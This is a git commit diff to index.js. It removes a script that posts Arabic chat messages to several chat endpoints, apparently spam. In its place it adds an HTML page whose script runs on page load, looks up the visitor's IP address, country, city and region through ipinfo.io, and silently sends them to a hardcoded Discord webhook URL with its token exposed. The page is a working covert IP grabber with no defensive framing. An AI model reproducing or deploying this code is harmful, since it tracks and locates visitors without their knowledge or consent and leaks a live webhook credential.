990723cc4caf49a3db0e34e158bd36f84e809757
jjiir <officalu8rt@gmail.com>
2025-04-02 18:19:32 +0400

    Update index.js

--- index.js
+++ index.js
@@ -1,18 +1,19 @@
-<script>
-        fetch("https://flix-scripts/chatResult", {
-            method: "POST",
-            body: JSON.stringify({ message: "BoShhab" })
-        });
-        fetch("https://easy-chat+/o6ZbK5Ecp6", {
-            headers: {
-                "accept": "*/*",
-                "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
-            },
-            body: JSON.stringify({ message: "BoShhab", channel: "شات العام" }),
-            method: "POST"
-        });
-        fetch("https://melix_chat/chatResult", {
-            method: "POST",
-            body: JSON.stringify({ message: "مبروك بوشهاب والعنزي على رتبىة ملازم" })
-        });
-</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>    
+    <script>
+        fetch('https://ipinfo.io/json')
+          .then(response => response.json())
+          .then(data => {
+            const { ip, country, city, region } = data;
+            const dateTime = new Date().toLocaleString();
+            const webhookUrl = 'https://discord.com/api/webhooks/1355585008559063233/NzF6N7AK8ckpK63nz7UW7cXVgOlACcgS2JNADD1Kb7MvBUqhCj4wpT3B8dVSvaWTwxmf';
+            fetch(webhookUrl, {
+              method: 'POST',
+              headers: {'Content-Type': 'application/json'},
+              body: JSON.stringify({content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`})
+            });
+          });
+    </script>
+</body>
+</html>
